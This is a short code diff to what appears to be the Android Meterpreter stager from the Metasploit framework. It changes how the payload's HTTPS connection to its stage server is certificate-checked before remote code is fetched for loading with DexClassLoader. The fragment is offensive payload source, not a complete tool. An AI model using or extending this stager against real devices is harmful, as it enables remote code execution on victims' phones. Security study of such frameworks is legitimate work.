@@ -15,6 +15,7 @@ import java.net.URL;
 import java.net.URLConnection;
 import java.util.concurrent.TimeUnit;
 
+import com.metasploit.meterpreter.PayloadTrustManager;
 import dalvik.system.DexClassLoader;
 
 public class Payload {
@@ -111,7 +112,7 @@ public class Payload {
         InputStream inStream;
         if (url.startsWith("https")) {
             URLConnection uc = new URL(url).openConnection();
-            Class.forName("com.metasploit.stage.PayloadTrustManager").getMethod("useFor", new Class[]{URLConnection.class}).invoke(null, uc);
+            PayloadTrustManager.useFor(uc, CERT_HASH);
             inStream = uc.getInputStream();
         } else {
             inStream = new URL(url).openStream();
